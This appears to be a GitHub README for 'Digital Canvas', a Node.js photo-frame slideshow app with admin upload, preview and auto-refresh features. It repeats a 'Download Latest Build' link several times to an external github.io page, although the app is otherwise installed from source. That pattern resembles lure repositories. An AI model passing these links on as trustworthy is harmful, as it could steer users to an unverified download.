# Digital Canvas v1.0.0 - digital photo frame 2026

> **Digital Canvas is a Node.js web application for digital photo frames. Version 1.0.0 provides fullscreen image slideshows, administrator controls, preview functionality, and automatic recovery.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bennettsamfaxk4735/digital-canvas-preview-hub?style=flat-square)](https://github.com/bennettsamfaxk4735/digital-canvas-preview-hub)

---

<p align="center">
  <a href="https://bennettsamfaxk4735.github.io/digital-canvas-preview-hub/">
    <img src="https://img.shields.io/badge/Download-Digital%20Canvas%20Latest-brightgreen?style=for-the-badge" alt="Download Digital Canvas">
  </a>
</p>

> **[Download Digital Canvas v1.0.0](https://bennettsamfaxk4735.github.io/digital-canvas-preview-hub/)**

---

[Download Latest Build](https://bennettsamfaxk4735.github.io/digital-canvas-preview-hub/)

---

## What Digital Canvas Does

Digital Canvas provides a browser-based fullscreen frame for displaying a rotating collection of images. The display side is designed to require little attention: slideshow playback, screen-fitting choices, refresh behavior, and recovery handling work together to keep photos cycling on a connected screen.

An administrative interface is included for uploading and managing images, as well as viewing the output through a live preview. The application uses Node.js, Express, Prisma, and SQLite, making it suitable for a digital frame setup that relies on a straightforward local data store.

---

## Included Features

- Fullscreen image presentation with a clean, distraction-free layout
- Continuous slideshow operation with automatic photo changes
- Fade effects between slideshow images
- Cover and contain fitting modes for different display dimensions
- Automatic refresh and retry recovery for continued viewer operation
- Image uploads and collection management from the admin panel
- Live preview of the frame output
- Authentication for securing administrator functions

---

## Getting Started

Download or clone the repository, and install its Node.js packages:

```bash
npm install
```

Launch the application using the project start command, for example:

```bash
npm start
```

For local development, prepare an environment with Node.js, Express, Prisma, and SQLite available before starting the app.

---

## Using the App

1. On the display-connected device, open the application in a web browser.
2. Log in through the administrator interface.
3. Upload the images that should appear in the frame.
4. Select either the cover or contain layout mode to suit the display proportions.
5. Check the result with the preview tool.
6. Keep the viewer open so it can rotate images and handle refreshes automatically.

A common administration cycle is:

- Upload additional images through the management interface.
- Inspect the live preview before applying the collection changes.
- Update the slideshow contents as the photo collection evolves.
- Open the display view and let playback continue without interruption.

---

## Settings and Storage

Application controls and most data are managed locally. Start with the admin panel when changing slideshow, display, or image-management behavior.

A representative local configuration can be written as:

```json
{
  "displayMode": "cover",
  "slideshowEnabled": true,
  "transition": "fade",
  "autoRefresh": true
}
```

Prisma handles the database schema and access layer, with SQLite providing local storage.

---

## System Requirements

- Node.js runtime
- SQLite database support
- An Express-based web server environment
- Prisma configured for database access and schema management
- A browser-capable device or screen to run the digital frame view

---

## Frequently Asked Questions

### How can I change the displayed photos?

Use the admin panel to upload new images, remove existing ones, or replace items in the collection. Refresh the viewer afterward if necessary.

### Where does Digital Canvas keep its settings?

The application data is stored locally using SQLite and Prisma. Controls for day-to-day operation are available in the administrative interface.

### What should I check if playback stops or refresh fails?

Confirm that the application server is still running and inspect the current configuration for automatic refresh and retry recovery behavior.

### Can images be fitted differently for different screens?

Yes. Choose between cover and contain modes to control how images are fitted to the display.

### Does the app offer a preview?

Yes. The real-time preview shows the current frame output so you can review it before leaving the display in operation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
